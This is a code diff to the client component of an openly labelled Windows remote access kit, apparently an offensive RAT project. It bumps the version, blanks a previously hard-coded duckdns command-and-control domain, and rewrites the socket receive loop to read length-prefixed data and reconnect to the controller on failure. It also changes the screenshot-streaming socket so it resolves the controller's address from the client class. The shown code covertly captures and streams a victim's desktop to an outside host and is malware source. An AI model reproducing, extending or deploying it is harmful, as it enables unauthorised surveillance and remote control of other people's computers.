@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.1
+# Build:  1.0.2
 # -------------------------------------------------------------
 
 import socket
@@ -136,7 +136,7 @@ class ClientSocket:
     # Keep all strings in an init function for later usage
     def __init__(self):
         self.heartbeat = 'echo'
-        self.dns_address = 'manuallolz.duckdns.org'
+        self.dns_address = ''
         self.env_var = 'USERNAME'
         self.python_flag = 'python'
         self.system_command = 'system'
@@ -249,13 +249,20 @@ class ClientSocket:
 
     #Function will retrieve all data sent by server socket
     def recv_all_data(self):
-        bytes_data = b''                                    #Create empty byte string
-        while True:                                         #Create infinite loop
-            partial_data = self.client_socket.recv(BUFFER)  #Receive encrypted data from server
-            bytes_data += partial_data                      #Add each itteration to empty byte string
-            if len(partial_data) < int(BUFFER):             #If the length of the partial string is less than the buffer size
-                break                                       #Data transmission is complete. Break the loop
-        return bytes_data                                   #Return byte data string sent from server
+        try:
+            bytes_data = b''                                                #Create empty bytes object
+            initial_data = self.client_socket.recv(BUFFER)                  #Get initial data from server
+            data_size = initial_data.split('|'.encode())                    #Grabe the size of the data from the forefront
+            if len(initial_data) < int(str(data_size[0].decode())):         #If the length of the init data is less than the size of the data sent
+                bytes_data+=data_size[1]                                    #Add the encrypted data to the bytes object
+                while len(bytes_data) != int(str(data_size[0].decode())):   #While the length of the bytes obj is not equal to the size of the encrypted data
+                    partial_data = self.client_socket.recv(BUFFER)          #Receive more data
+                    bytes_data += partial_data                              #Add data to bytes object
+                return bytes_data                                           #Return the bytes data when the data received == the data sent
+            else:                                                           #Else the initial data is all the data
+                return data_size[1]                                         #Return the encrypted data half of the array from the split
+        except ValueError:                                                  #If there is a value error, indicating the connection with the server was lost
+            return self.connect_to_server()                                 #connect back to the server
 
     #Funtion will get data from the server and return it as plaintext. If the server disconnects, the client will attempt
     #To connect back
@@ -287,7 +294,6 @@ class StreamSocket:
 
     def __init__(self):
         self.image_file_path = str(f'{os.getenv("userprofile")}\\AppData\\Local\\Temp\\c.jpg')
-        self.dns_address = 'manuallolz.duckdns.org'
 
     #Function will take a screenshot, save, read and return the data
     def take_screenshot(self):
@@ -301,7 +307,7 @@ class StreamSocket:
     #Function will take single or multiple screenshots depending on boolean parameter
     def stream_desktop(self,screenshot):
         StreamSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)         #Create socket
-        ip_address = socket.gethostbyname(self.dns_address)                     #Resolve dns
+        ip_address = socket.gethostbyname(ClientSocket().dns_address)           #Resolve dns
         StreamSocket.connect((ip_address,STRM_PORT))                            #connect to ip and streaming port
         if not screenshot:                                                      #If screenshot is false
             while True:                                                         #Start loop
